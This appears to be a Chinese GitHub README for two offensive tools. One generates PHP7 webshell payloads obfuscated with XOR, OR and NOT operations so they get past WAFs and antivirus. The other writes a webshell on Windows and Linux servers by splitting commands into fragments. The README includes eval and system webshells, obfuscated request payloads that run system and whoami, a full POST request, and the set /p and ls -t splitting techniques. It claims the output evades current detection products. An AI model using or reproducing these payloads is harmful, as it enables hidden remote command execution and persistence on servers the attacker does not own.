# PHP7免杀命令生成脚本

## 前言

复习PHP命令执行，免杀是躲不掉的；所以看了很多巨佬的干货后，总结了下经验，写了这么一个工具

第一次发GitHub....说明文档存在缺陷或工具存在BUG请及时提出~

## 结果

合理使用工具生成的Payload，是能过最新的D盾和安全狗的

![image-20211123144015380](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/PHP下WebShell混淆Payload/1.png)

## 功能

生成常规字符串，但是由**非敏感字符、非边界符与非字母**经过异或、或、与、取反运算后得到；方便你进行各种骚操作~

小Tips：

```
PHP5的免杀十分灵活，在此不做多解释，参考链接全都是。

PHP7重点在于对$_GET等这类极度敏感的变量隐藏，而不是函数的隐藏（也没有必要）

函数执行基本围绕:

(可变函数名)(参数)
${可变函数名}[参数]
${可变函数名}{参数}
...
你当然可以使用注释提取，本地变量注册等精湛技艺，或者安心找更冷门的回调函数...
```

一个小示例，测试马

```php
<?php
eval($_GET['cmd']);
?>
```

然后可以用工具根据你输入的命令与参数，生成混淆后的形参

```http
http://192.168.85.139/?cmd=${("%5E%5E%40%0B"^"%01%19%05_")}{%ff}(("%04"|"%60").("%60"|"%09").("%12"|"%60"));&%ff=system
```

实际上PHP执行的命令就是

> eval(system(dir);)

![image-20211123160641617](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/PHP下WebShell混淆Payload/2.png)

同时你完全可以把它改成一个马~比如:

```php
$a=urldecode("%7B%7B%5C_")^urldecode("%24%3C%19%0B");
$b=${$a}{'0xff'};
eval("\t".$b);
```

## 使用注意

--- ---

A模式根据你的命令与参数生成完整的混淆参数，B模式单纯对某个字符串进行混淆

-- ---

长格式类似

```
('aaa'^'bbb')
```

短格式类似

```
('a'^'b').('b'^'c')
```

--- ---

取反必须为`not`和`~`

--- ---

由于全随机性异或选取（不可避免），会导致一定程度的错误生成；所以在你正式使用之前请务必本地测试效果后再用！

--- ---

选择下标从1开始

--- ---

最后，因为时间匆忙没有做完美的异常处理，一旦造成任何错误（比如只有18种但你输了20）请强制退出再重开-=-

## 示例

（具体改成什么样的马请发挥你的想象，嘿嘿）

还是这个测试马

```php
<?php
eval($_GET['cmd']);
?>
```

之前介绍了GET方法，假如要使用POST呢，比如要执行system(whoami)

生成这个

```
${("%5E%5E4-/"^"%01%0E%7B~%7B")}{%ff}(("7"|"%60").("%60"|"%08").("/"|"%60").("%21"|"%40").("%60"|"%0D").("%60"|"%09"));&%ff=system
```

![image-20211123215215046](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/PHP下WebShell混淆Payload/3.png)

然后改成这样，通过BP发包

```http
POST /?cmd=${("%5E%5E4-/"^"%01%0E%7B~%7B")}{%ff}(("7"|"%60").("%60"|"%08").("/"|"%60").("%21"|"%40").("%60"|"%0D").("%60"|"%09")); HTTP/1.1
Host: 192.168.85.128
...
Content-Length: 10

%ff=system
```

命令执行成功

![image-20211123220213671](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/PHP下WebShell混淆Payload/4.png)

# Windows和Linux下命令拆分写马

## 介绍

大家学RCE的时候，肯定都见过命令拆分的形式发包写马...所以写了两个py脚本

一个win下的cmd（为了兼容）、一个linux下的bash

用的马都是这个

```php+HTML
<?php
    $cmd = $_POST['cmd'];
    // if(strlen($cmd) < 16){
        system($cmd);
		echo $cmd;
    // }
	// else
		// echo "Wrong!"
?>
```

## Win

这个脚本比较简单，主要是利用自己想的一个语法糖。因为cmd默认用echo输出是会带回车的...并不能用来写马

琢磨了很久:

```powershell
set /p=^{c}<nul>>1.php
```

利用set命令的/p选项；传入`nul`这个空白标识符，再赋值给空白变量就会直接输出！然后再重定向到马就可以啦

![image-20211204175152703](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/Windows和Linux下命令拆分写马/1.png)

配置好后执行，每个POST包都是下图这个样子，完美过WAF

![image-20211204175720319](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/Windows和Linux下命令拆分写马/2.png)

![image-20211204184156575](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/Windows和Linux下命令拆分写马/8.png)

查看服务器，写入成功~

![image-20211204175816217](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/Windows和Linux下命令拆分写马/3.png)

## Linux

这个有点难度。用了下自己改进的KMP算法，这样脚本自身就会进行先进行字符串有效性判断再生成

所以只需要更改你要写入的命令就好！灰常方便~

思路倒是简单

```
echo {com} | base64 -d >1.php是我们要最终执行的命令
把这个命令按改进的KMP算法拆分成有效的字符串，生成类似'>字符串\\'这样的命令；最终被系统执行后，就会写一个名称和'字符串\'相同的空文件
然后用ls -t | head -{command_length+1}>456命令，把所有你写入的的空文件名称，按时间顺序写入到456文件中
但是ls -t | head -{command_length+1}>456太长，所以按照上面的做法也进行一次拆分；最终将这个命令写道123文件中
最后只需要执行123文件，就会生成456文件；执行456文件，就能成功写马啦
```

修改的地方只有

![image-20211204182642863](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/Windows和Linux下命令拆分写马/4.png)

和报头而已~

![image-20211204182707946](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/Windows和Linux下命令拆分写马/5.png)

执行完后，服务器上就会这个样子

![image-20211204182829761](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/Windows和Linux下命令拆分写马/6.png)

同时可以查看发的包，WAF也是不认的

![image-20211204183136069](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/Windows和Linux下命令拆分写马/7.png)

# 参考链接

[独特的免杀思路](http://uuzdaisuki.com/2021/05/11/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6php%E7%AF%87/)

[PHP7后的免杀思路](https://www.anquanke.com/post/id/193787)

[较全的PHP5、PHP7免杀浅谈](https://www.freebuf.com/articles/network/279563.html)

[国光的PHPWebshell免杀总结](https://www.sqlsec.com/2020/07/shell.html#toc-heading-24)

[Windows与Linux的Apache安装](https://cloud.tencent.com/developer/article/1698069)

[P神的无字母数字WebShell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list)

[P神的无字母数字Webshell续](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list)

[命令注入长度绕过CTF题](https://www.cnblogs.com/-chenxs/p/11981586.html)

[命令注入小结](https://www.mi1k7ea.com/2019/06/30/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/)

还有一些博客在查阅资料时疏于记录，但同样给予了重大改进；在此表达真挚的感谢！